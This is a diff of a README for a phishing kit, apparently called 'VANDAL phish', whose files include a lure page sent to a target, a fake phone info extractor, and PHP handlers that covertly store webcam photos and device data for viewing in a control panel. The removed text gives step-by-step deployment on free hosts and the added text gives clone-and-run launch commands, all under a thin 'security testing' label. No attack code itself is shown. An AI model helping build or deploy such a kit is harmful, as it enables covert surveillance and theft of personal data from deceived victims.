@@ -1,14 +1,19 @@
-# VANDAL Kit
+# ⚡ VANDAL phish
+
+Advanced phishing toolkit for security testing.
 
 ## Files
-- `index.html` - SMS Bomber page (send to target)
-- `save.php` - Stores webcam photos + device data
-- `panel.php` - View captured photos
+- `index.html` - SMS Bomber page
+- `spy-tool.html` - Fake phone info extractor
+- `save.php` - Data handler
+- `panel.php` - Advanced control panel
+- `login.php` - Panel login
+- `run.sh` - One-click launch
 
-## How to use
-1. Upload all 3 PHP files to any PHP host (infinityfree, 000webhost, etc)
-2. Send `index.html` link to target
-3. Open `panel.php` to see captured webcam photos
+## Usage
 
-## ⚠️ Disclaimer
-For educational purposes only. Use only on targets you own or have permission to test.
+git clone https://github.com/vandalcyberi-droid/VANDAL-PHISH
+
+cd VANDAL-PHISH
+
+bash run.sh
